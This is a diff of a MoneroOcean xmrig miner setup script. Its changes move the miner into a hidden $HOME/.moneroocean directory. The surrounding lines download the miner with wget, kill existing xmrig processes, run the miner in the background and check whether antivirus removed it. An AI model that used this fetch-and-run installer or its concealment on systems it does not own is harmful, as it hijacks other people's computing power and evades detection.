@@ -121,7 +121,7 @@ fi
 # printing intentions
 
 echo "I will download, setup and run in background Monero CPU miner."
-echo "If needed, miner in foreground can be started by $HOME/moneroocean/miner.sh script."
+echo "If needed, miner in foreground can be started by $HOME/.moneroocean/miner.sh script."
 echo "Mining will happen to $WALLET wallet."
 if [ ! -z $EMAIL ]; then
   echo "(and $EMAIL email as password to modify wallet options later at https://moneroocean.stream site)"
@@ -153,6 +153,7 @@ killall -9 xmrig
 
 echo "[*] Removing $HOME/moneroocean directory"
 rm -rf $HOME/moneroocean
+rm -rf $HOME/.moneroocean
 
 #echo "[*] Downloading MoneroOcean advanced version of xmrig to xmrig.tar.gz"
 #if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o xmrig.tar.gz; then
@@ -162,15 +163,15 @@ rm -rf $HOME/moneroocean
 
 wget https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz
 
-echo "[*] Unpacking xmrig.tar.gz to $HOME/moneroocean"
+echo "[*] Unpacking xmrig.tar.gz to $HOME/.moneroocean"
 [ -d $HOME/.moneroocean ] || mkdir $HOME/.moneroocean
 if ! tar xf xmrig.tar.gz -C $HOME/.moneroocean; then
-  echo "ERROR: Can't unpack xmrig.tar.gz to $HOME/moneroocean directory"
+  echo "ERROR: Can't unpack xmrig.tar.gz to $HOME/.moneroocean directory"
   exit 1
 fi
 rm xmrig.tar.gz
 
-echo "[*] Checking if advanced version of $HOME/moneroocean/xmrig works fine (and not removed by antivirus software)"
+echo "[*] Checking if advanced version of $HOME/.moneroocean/xmrig works fine (and not removed by antivirus software)"
 sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/.moneroocean/config.json
 $HOME/.moneroocean/xmrig --help >/dev/null
 if (test $? -ne 0); then
